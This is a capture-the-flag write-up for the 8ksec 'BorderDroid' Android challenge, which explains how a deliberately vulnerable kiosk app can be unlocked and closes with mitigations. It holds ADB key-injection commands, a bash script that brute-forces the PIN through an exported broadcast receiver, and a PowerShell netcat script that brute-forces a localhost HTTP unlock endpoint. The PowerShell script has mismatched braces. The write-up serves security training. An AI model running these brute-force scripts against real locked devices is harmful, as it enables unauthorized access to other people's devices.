---
title: "Challenge 05: BorderDroid"
published: 2025-10-07
description: "Android Kiosk Mode Bypass: Multiple Attack Vectors Against PIN-Protected Lock Screen with HTTP endpoint exploitation and broadcast receiver vulnerabilities."
image: "https://lwfiles.mycourse.app/66c35021da1fe6df974b8aee-public/42e3aa7f390f8662c067b48de036761c.png"
category: "Mobile"
tags: ["android", "8ksec.io", "mobile-exploitation", "kiosk-mode", "broadcast-receiver", "http-security"]
series:
  id: "8ksec-android-challenges"
  order: 5
---

*( بِسْمِ اللَّـهِ الرَّحْمَـٰنِ الرَّحِيمِ )*

:::caution
 #FreePalastine
:::

---

# Android Kiosk Mode Bypass: When Multiple Attack Surfaces Lead to Complete Device Takeover

In this challenge, we explore a critical security failure in an Android kiosk application that's supposed to lock down devices at border control checkpoints. What makes this particularly interesting is that the app has **three distinct attack vectors** - all leading to the same catastrophic outcome: complete device unlock without knowing the PIN.

## Initial Discovery

BorderDroid is a kiosk application designed to lock Android devices into a single-app mode, preventing users from accessing anything except a secure lock screen. The app requires a 6-digit PIN to unlock and return control to the user.

When inspecting the `AndroidManifest.xml`, I immediately spotted **two suss defines, a reciever and a service provider**:

```xml
<!-- Vulnerability #1: Exported Broadcast Receiver -->
<receiver 
    android:enabled="true" 
    android:exported="true"  <!--  remote trigger? exported? really? -->
    android:name="com.eightksec.borderdroid.receiver.RemoteTriggerReceiver">
    <intent-filter>
        <action android:name="com.eightksec.borderdroid.ACTION_PERFORM_REMOTE_TRIGGER"/>
    </intent-filter>
</receiver>

<!-- Vulnerability #2: Foreground HTTP Service -->
<service
    android:name="com.eightksec.borderdroid.service.HttpUnlockService"
    android:enabled="true"  <!--  HTTP Unlock ? ummmmm -->
    android:exported="false" 
    android:foregroundServiceType="connectedDevice"/>
```

The broadcast receiver is **completely exposed** to any app on the device, and there's a suspicious HTTP service running. Let's dig deeper.

---

## Understanding the App Architecture

Before exploiting BorderDroid, it's crucial to understand how this kiosk app actually works - and more importantly, **what it doesn't do**.

### The Kiosk Lock Mechanism

When you launch BorderDroid, it immediately enters **Lock Task Mode** (kiosk mode):

```java
// YouAreSecureActivity.java onCreate()
startLockTask();  // Single-app mode - can't exit or switch apps
setKioskState(true);  // Starts HttpUnlockService
```

This locks the device into a single-app mode. The user is presented with:

- A clock and date display
- A 6-digit PIN entry interface (numpad 0-9)
- An emergency call button

### The UI Deception

Here's where it gets interesting - **the PIN entry UI is purely cosmetic**. When you look at the code:

```java
// setupNumpad() in YouAreSecureActivity
private void setupNumpad(GridLayout numpadGrid) {
    for (int i = 0; i < numpadGrid.getChildCount(); i++) {
        View child = numpadGrid.getChildAt(i);
        if (child instanceof Button) {
            Button button = (Button) child;
            String number = button.getText().toString();
            if (number.matches("\\d")) {
                // Only appends to display, never verifies!
                button.setOnClickListener(v -> {
                    enteredPin.append(number);
                    updatePinDots();  // Just visual feedback
                });
            }
        }
    }
}
```

**Notice what's missing?** There's no `verifyPin()` call. The numpad buttons only:

1. Append digits to `enteredPin` (a StringBuilder)
2. Update the visual dots on screen
3. **Never actually check if the PIN is correct**

The only code that handles the delete button:

```java
private void onDeleteClick() {
    if (enteredPin.length() > 0) {
        enteredPin.deleteCharAt(enteredPin.length() - 1);
        updatePinDots();  // Again, just visual
    }
}
```

### The Real Unlock Mechanisms

So if the UI doesn't verify PINs, how does the app actually unlock? There are **three separate pathways**:

#### 1. Volume Key Sequence (Hidden Feature)

The app listens for a specific hardware button sequence:

```java
// Volume sequence: UP, DOWN, UP, DOWN (Vol+, Vol-, Vol+, Vol-)
private final List<Integer> targetSequence = Arrays.asList(
    KeyEvent.KEYCODE_VOLUME_UP,    // 24
    KeyEvent.KEYCODE_VOLUME_DOWN,  // 25
    KeyEvent.KEYCODE_VOLUME_UP,    // 24
    KeyEvent.KEYCODE_VOLUME_DOWN   // 25
);

private void checkVolumeSequence() {
    if (volumeSequence.equals(targetSequence)) {
        unlockAndReturnToDashboard();  // Direct unlock - no PIN needed!
    }
}
```

This bypasses PIN verification entirely and directly calls `stopLockTask()`.

#### 2. Broadcast Receiver (RemoteTriggerReceiver)

The exported broadcast receiver accepts PIN verification requests:

```java
// RemoteTriggerReceiver.java
public void onReceive(Context context, Intent intent) {
    String pin = intent.getStringExtra("EXTRA_TRIGGER_PIN");
    if (pin != null && PinStorage.verifyPin(context, pin)) {
        performUnlockActions(context);  // Unlocks if PIN matches
    }
}
```

#### 3. HTTP Service (HttpUnlockService)

A NanoHTTPD server runs on `localhost:8080`:

```java
// HttpUnlockService$WebServer.java
public Response serve(IHTTPSession session) {
    if (method == POST && uri.equals("/unlock")) {
        JSONObject json = new JSONObject(postData);
        String pin = json.optString("pin");
        
        // Internally broadcasts to RemoteTriggerReceiver!
        broadcastVulnerableUnlockIntentWithPin(pin);
    }
}
```

### The Architecture's Fatal Flaw

The app's security model is fundamentally broken:

```text
┌─────────────────────────────────────┐
│   YouAreSecureActivity (UI)         │
│   - Shows PIN entry interface       │
│   - Buttons DON'T verify PIN        │  <-- UI is a decoy!
│   - Only updates visual dots        │
└─────────────────────────────────────┘
              │
              │ (No verification path from UI)
              │
┌─────────────▼───────────────────────┐
│   Actual Unlock Mechanisms:         │
│                                      │
│   1. Volume sequence                │
│      → Direct unlock (no PIN)       │
│                                      │
│   2. RemoteTriggerReceiver          │
│      → Exported broadcast           │  <-- Attack surface!
│      → Verifies PIN                 │
│                                      │
│   3. HttpUnlockService              │
│      → localhost:8080               │  <-- Attack surface!
│      → Calls RemoteTriggerReceiver  │
└──────────────────────────────────────┘
```

The user thinks they're entering a PIN through the UI, but:

- The UI buttons never trigger verification
- The actual verification happens through **exported interfaces** (broadcast/HTTP)
- Both interfaces are accessible without any authentication
- Both interfaces have **no rate limiting**

This disconnect between the UI and the actual verification logic creates multiple attack vectors that we'll exploit next.

---

## The Three Attack Vectors

### Attack Vector #1: Hardware Key Simulation

The app has a legitimate unlock mechanism using **volume keys**:

```java
// VolumeKeyReceiver.kt
if (keyCode == KeyEvent.KEYCODE_VOLUME_UP) {
    volumeUpPressed++
} else if (keyCode == KeyEvent.KEYCODE_VOLUME_DOWN) {
    volumeDownPressed++
}

// Secret sequence: Vol Up , Vol Down , Vol Up, Vol Down

```

This can be triggered via ADB:

```bash
# Simulate  Volume Up
adb shell input keyevent 24
# Simulate Volume Down
adb shell input keyevent 25
# Simulate  Volume Up
adb shell input keyevent 24
# Simulate Volume Down
adb shell input keyevent 25
echo "done"
```

**However, we still don't know the PIN!**, was this intended ? maybe ? lets check another way :"D

---

### Attack Vector #2: Exported Broadcast Receiver

The `RemoteTriggerReceiver` accepts broadcast intents with a PIN parameter:

```kotlin
// RemoteTriggerReceiver.kt
override fun onReceive(context: Context, intent: Intent) {
    val pin = intent.getStringExtra("com.eightksec.borderdroid.EXTRA_TRIGGER_PIN")
    if (pin != null) {
        verifyPin(pin)  // No rate limiting! No authentication!
    }
}
```

This means **any app can brute force all 1,000,000 PINs**!
Yea internals can bruteforced as well :'D

**POC - Broadcast Attack (via ADB):**

```bash
#!/bin/bash
# Simple broadcast brute force via ADB

for pin in {000000..999999}; do
    # Send broadcast with PIN
    adb shell am broadcast \
        -a com.eightksec.borderdroid.ACTION_PERFORM_REMOTE_TRIGGER \
        -n com.eightksec.borderdroid/.receiver.RemoteTriggerReceiver \
        --es com.eightksec.borderdroid.EXTRA_TRIGGER_PIN "$pin"
    
    # Check if unlocked (every 100 attempts to save time)
    if [ $((pin % 100)) -eq 0 ]; then
        activity=$(adb shell dumpsys activity activities | grep -m 1 mResumedActivity)
        if [[ "$activity" == *"DashboardActivity"* ]]; then
            echo "✅ PIN FOUND: $pin"
            exit 0
        fi
    fi
done
```

---

### Attack Vector #3: HTTP Endpoint

Here's where it gets interesting. The app runs a **local HTTP server on port 8080** that accepts unlock requests:

```kotlin
// HttpUnlockService.kt - WebServer class
override fun serve(session: IHTTPSession): Response {
    if (session.method == Method.POST && "/unlock".equals(session.uri, true)) {
        val json = JSONObject(postData)
        val pin = json.optString("pin")
        
        //  No authentication
        //  No rate limiting
        //  Accessible from localhost
        broadcastVulnerableUnlockIntentWithPin(pin)
        
        return newFixedLengthResponse(Status.OK, "text/plain", 
            "Unlock attempt initiated (vulnerable pathway).")
    }
}
```

**The Critical Flaw:**

1. No authentication required
2. No rate limiting
3. Accessible from any local process
4. **Internally calls the same broadcast receiver!**

**POC - HTTP Attack (PowerShell):**

```powershell
#!/usr/bin/env pwsh
# Simple HTTP brute force via ADB + netcat

param([int]$StartPin = 0, [int]$EndPin = 999999)

Write-Host "🚀 BorderDroid HTTP Brute Force" -ForegroundColor Cyan

for ($pin = $StartPin; $pin -le $EndPin; $pin++) {
    $paddedPin = $pin.ToString().PadLeft(6, '0')
    $json = "{`"pin`":`"$paddedPin`"}"
    $contentLength = $json.Length
    $escapedJson = $json.Replace('"', '\"')
    
    # Send HTTP POST via netcat
    $cmd = 'printf "POST /unlock HTTP/1.1\r\nHost: localhost:8080\r\nContent-Type: application/json\r\nContent-Length: ' + $contentLength + '\r\n\r\n' + $escapedJson + '" | toybox nc -w 2 localhost 8080'
    $response = adb shell $cmd 2>&1
    
    }
}

Write-Host "❌ No valid PIN found" -ForegroundColor Red
```

---

## n00bies Questions on the way

### 1. What is Kiosk Mode?

**Kiosk Mode** locks an Android device to a single app, preventing access to other apps, settings, or the home screen. It's commonly used for:

- **Point-of-sale terminals** (restaurant ordering tablets)
- **Information kiosks** (museum displays, airport check-in)
- **Border control devices** (like this challenge!)
- **Parental controls** (kids' tablets locked to educational apps)

In Android, kiosk mode is implemented using:

```kotlin
// Start lock task mode
startLockTask()

// User can't:
// - Exit the app
// - Access notifications
// - Use home/back buttons
// - Access quick settings
```

To exit kiosk mode, the app must explicitly call `stopLockTask()`, which BorderDroid does only after correct PIN verification.

### 2. What Made the Broadcast Receiver Vulnerable? Was it Static or Dynamic?

The broadcast receiver was vulnerable because it's **exported** without permission protection:

```xml
<receiver 
    android:exported="true"  <!--  the exported nightmare xd -->
    android:name="com.eightksec.borderdroid.receiver.RemoteTriggerReceiver">
    <!--  No android:permission defined! Learn some security for godsake!-->
    <intent-filter>
        <action android:name="com.eightksec.borderdroid.ACTION_PERFORM_REMOTE_TRIGGER"/>
    </intent-filter>
</receiver>
```

**This is a STATIC receiver** (declared in `AndroidManifest.xml`), not a dynamic one (registered in code).

**Static vs Dynamic Receivers:**

| **Static Receiver** | **Dynamic Receiver** |
|---------------------|----------------------|
| Declared in `AndroidManifest.xml` | Registered in code (`registerReceiver()`) |
| Survives app restarts | Dies when component is destroyed |
| Can wake up the app | Only works while registered |
| **Exported by default if `<intent-filter>` exists** | Private by default |

**How to fix:**

```xml
<!-- Define custom permission -->
<permission
    android:name="com.eightksec.borderdroid.permission.UNLOCK"
    android:protectionLevel="signature" />

<!-- Protect the receiver -->
<receiver 
    android:exported="true"
    android:permission="com.eightksec.borderdroid.permission.UNLOCK"
    android:name="com.eightksec.borderdroid.receiver.RemoteTriggerReceiver">
    <intent-filter>
        <action android:name="com.eightksec.borderdroid.ACTION_PERFORM_REMOTE_TRIGGER"/>
    </intent-filter>
</receiver>
```

Now only apps signed with the **same certificate** can send broadcasts!

### 3. How Can Software Simulate Hardware? (ADB Key Events)

When I run `adb shell input keyevent 24`, ADB is **injecting events directly into the Android input system**, simulating a physical button press.

**Here's how it works:**

```
┌─────────────────────────────────────┐
│  Physical Hardware                  │
│  (Volume Up Button)                 │
└────────────┬────────────────────────┘
             │ Hardware Interrupt
             ▼
┌─────────────────────────────────────┐
│  Linux Kernel (/dev/input/eventX)  │
│  Input Event Driver                 │
└────────────┬────────────────────────┘
             │ Event (KEY_VOLUMEUP)
             ▼
┌─────────────────────────────────────┐
│  Android InputFlinger Service       │
│  (System Server Process)            │
└────────────┬────────────────────────┘
             │ Dispatch Event
             ▼
┌─────────────────────────────────────┐
│  App's onKeyDown() Handler          │
│  dispatchKeyEvent()                 │
└─────────────────────────────────────┘
```

**ADB bypasses the hardware layer** and injects events directly:

```
┌─────────────────────────────────────┐
│  ADB Command                        │
│  adb shell input keyevent 24        │
└────────────┬────────────────────────┘
             │ IPC (Binder)
             ▼
┌─────────────────────────────────────┐
│  Android InputManager Service       │
│  (System-level service)             │
└────────────┬────────────────────────┘
             │ Inject Event
             ▼
┌─────────────────────────────────────┐
│  InputFlinger                       │
│  (same as hardware path!)           │
└────────────┬────────────────────────┘
             │
             ▼
┌─────────────────────────────────────┐
│  App receives KeyEvent              │
│  (can't tell it's simulated!)       │
└─────────────────────────────────────┘
```

**From the app's perspective, there's NO DIFFERENCE** between:

- Real hardware button press
- ADB simulated keyevent
- Another app calling `InputManager.injectInputEvent()`

This is why **you can't rely on hardware buttons for security** - software can mostly simulate them!

---

## Mitigations

Kindly Learn to defend as well, don't be a n00b :3

### 1. Protect the Broadcast Receiver

```xml
<!-- Option 1: Remove it entirely (best) -->
<!-- Just delete the <receiver> declaration -->

<!-- Option 2: Protect with signature permission -->
<permission
    android:name="com.eightksec.borderdroid.permission.REMOTE_UNLOCK"
    android:protectionLevel="signature" />

<receiver 
    android:exported="true"
    android:permission="com.eightksec.borderdroid.permission.REMOTE_UNLOCK"
    android:name="com.eightksec.borderdroid.receiver.RemoteTriggerReceiver">
    <intent-filter>
        <action android:name="com.eightksec.borderdroid.ACTION_PERFORM_REMOTE_TRIGGER"/>
    </intent-filter>
</receiver>
```

### 2. Secure the HTTP Service

```kotlin
// Add authentication
private val API_KEY = "secret_key_stored_securely"

override fun serve(session: IHTTPSession): Response {
    val authHeader = session.headers["authorization"]
    if (authHeader != API_KEY) {
        return newFixedLengthResponse(Status.UNAUTHORIZED, "text/plain", "Unauthorized")
    }
    
    // Add rate limiting
    if (rateLimiter.shouldBlock(getClientIP(session))) {
        return newFixedLengthResponse(Status.TOO_MANY_REQUESTS, "text/plain", "Rate limit exceeded")
    }
    
    // ... rest of code
}
```

### 3. Implement Rate Limiting

```kotlin
class RateLimiter {
    private val attempts = mutableMapOf<String, MutableList<Long>>()
    private val MAX_ATTEMPTS = 5
    private val TIME_WINDOW = 60_000L // 1 minute
    
    fun shouldBlock(identifier: String): Boolean {
        val now = System.currentTimeMillis()
        val userAttempts = attempts.getOrPut(identifier) { mutableListOf() }
        
        // Remove old attempts outside time window
        userAttempts.removeAll { it < now - TIME_WINDOW }
        
        // Check if exceeded max attempts
        if (userAttempts.size >= MAX_ATTEMPTS) {
            return true
        }
        
        userAttempts.add(now)
        return false
    }
}
```

---

*For more information about Android security best practices, visit the* [Android Security Documentation](https://developer.android.com/privacy-and-security/security-tips)
